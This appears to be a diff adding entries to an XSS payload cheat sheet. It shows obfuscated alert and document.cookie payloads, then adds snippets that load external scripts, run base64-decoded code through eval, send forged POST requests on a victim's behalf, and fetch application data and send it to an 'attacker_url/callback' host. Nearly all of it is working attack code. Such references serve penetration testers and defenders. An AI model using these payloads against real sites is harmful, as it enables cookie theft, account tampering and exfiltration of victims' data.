@@ -282,3 +282,50 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
 ```
 
+Load External Resource (url encode)
+
+```
+jQuery.getScript('url')
+```
+
+url encode 
+
+```
+'+eval(atob('base64code'))+'
+```
+
+changing data (post request) with XSS
+
+This will send a request on behalf of the victim user to change the details
+
+we can set also mode to `no-cors` and for credentials `include`
+
+```
+fetch('url',{
+method : 'POST',
+mode: 'same-origin',
+credentials : 'same-origin',
+headers : {
+'Content-Type' : 'application/x-www-form-urlencoded'
+},
+body:'actual_body_from_request'
+})
+```
+
+
+Get some data from the application by visiting a page and capture the response and log it (or send back to us)
+
+```
+fetch('url', {
+    method: 'POST',
+    mode: 'same-origin',
+    credentials: 'same-origin'
+})
+.then(response => response.json())
+.then(data => {
+    fetch('attacker_url/callback?' + encodeURIComponent(JSON.stringify(data)), {
+        mode: 'no-cors'
+    });
+});
+```
+
